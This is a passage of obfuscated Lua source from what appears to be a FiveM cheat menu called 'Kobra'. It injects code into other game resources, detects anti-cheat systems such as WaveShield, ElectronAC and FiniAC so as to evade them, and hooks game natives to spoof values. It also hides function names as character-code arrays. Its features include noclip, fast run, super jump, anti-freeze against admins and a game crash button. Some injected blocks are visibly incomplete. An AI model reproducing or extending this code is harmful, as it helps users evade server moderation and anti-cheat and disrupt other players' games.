                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v320   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v320   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v320   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v320   .. [[
                                            end
                                        ]] );else MachoInjectResource2(5 -2 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v320   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v320   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(6 -3 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25,step=0.25 -0 ,min=0.25,max=385 -(262 + 118) ,onSelect=function(v322,v323) v249:ToggleFreecam(v323,v322);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v324) if v324 then local v546=0 -0 ;while true do if (v546==(230 -(19 + 211))) then v0:Notify("success","Kobra","Fast Run On",3113 -(88 + 25) );if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else v0:Notify("error","Kobra","Fast Run Off",3000);if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v325) local v326=0;local v327;local v328;local v329;local v330;local v331;while true do if (v326==(1 + 0)) then function v328(v735) local v736=0 + 0 ;local v737;while true do if (v736==0) then v737="";for v999=1, #v735 do v737=v737   .. string.char(v735[v999]) ;end v736=1;end if (v736==(1037 -(1007 + 29))) then return v737;end end end v329=nil;v326=1 + 1 ;end if (v326==(0 -0)) then v327=GetResourceState("WaveShield")=="started" ;v328=nil;v326=4 -3 ;end if (v326==(1 + 1)) then function v329(v738) return _G[v328(v738)];end v330=nil;v326=814 -(340 + 471) ;end if (v326==(9 -5)) then function v331() local v739=589 -(276 + 313) ;while true do if (v739==(0 -0)) then _G.superJumpEnabled=false;v329({36 + 47 ,10 + 91 ,347 -231 ,55 + 28 ,52 + 65 ,277 -(4 + 161) ,101,357 -243 ,571 -(322 + 175) ,29 + 88 ,423 -(203 + 111) ,79 + 33 ,76 + 8 ,104,489 -(328 + 56) ,627 -(433 + 79) ,57 + 13 ,114,71 + 26 ,98 + 11 ,235 -134 })(v329({163 -83 ,1781 -(1506 + 167) ,97,387 -(58 + 208) ,101,66 + 48 ,297 -224 ,13 + 87 })(),1 -0 );break;end end end if v325 then if v327 then v330();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v327 then local v940=1470 -(1219 + 251) ;while true do if ((1671 -(1231 + 440))==v940) then print("off");v331();break;end end else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end break;end if (v326==3) then function v330() if  not _G.superJumpEnabled then local v830=58 -(34 + 24) ;while true do if (0==v830) then _G.superJumpEnabled=true;v329({125 -58 ,346 -232 ,101,254 -157 ,388 -272 ,1690 -(877 + 712) ,838 -(242 + 512) ,731 -(92 + 535) ,114,80 + 21 ,199 -102 ,363 -263 })(function() while _G.superJumpEnabled do v329({83,15 + 86 ,176 -60 ,1868 -(1476 + 309) ,117,366 -254 ,194 -(86 + 7) ,11 + 103 ,32 + 42 ,249 -(14 + 118) ,109,90 + 22 ,43 + 41 ,104,104 + 1 ,206 -91 ,174 -104 ,79 + 35 ,91 + 6 ,109,2075 -(1181 + 793) })(v329({387 -(105 + 202) ,108,97,487 -366 ,98 + 3 ,114,1022 -(438 + 511) ,1168 -(728 + 340) })());Wait(1790 -(816 + 974) );end end);break;end end end end v331=nil;v326=12 -8 ;end end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v332=0;local v333;while true do if (v332==0) then v333=nil;function v333() local v740=SetEntityHealth;v740(PlayerPedId(),0 + 0 );end v332=1811 -(1564 + 246) ;end if (v332==1) then v333();break;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1 -0 ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v334) if (v334=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v334=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v335) local v336=1212 -(583 + 629) ;local v337;local v338;while true do if (v336==(0 + 0)) then v337=GetResourceState("WaveShield")=="started" ;v338=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v336=1;end if (1==v336) then if v335 then if v337 then local v941=0;while true do if (v941==(0 -0)) then v0:Notify("success","Kobra","No Ragdoll Enabled",1573 + 1427 );v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);break;end end else local v942=1170 -(943 + 227) ;while true do if (v942==(0 + 0)) then v36(v338,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v0:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",4631 -(1539 + 92) );break;end end end elseif v337 then v0:Notify("success","Kobra","No Ragdoll Disabled",4946 -(706 + 1240) );v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);else local v943=258 -(81 + 177) ;while true do if (v943==0) then v36(v338,[[
                                            noRagdollEnabled = false
                                        ]]);v0:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",8476 -5476 );break;end end end break;end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v339) local v340=257 -(212 + 45) ;local v341;local v342;while true do if ((3 -2)==v340) then if v339 then if v341 then v0:Notify("success","Kobra","Anti-Freeze Enabled",4946 -(708 + 1238) );v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);else v36(v342,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
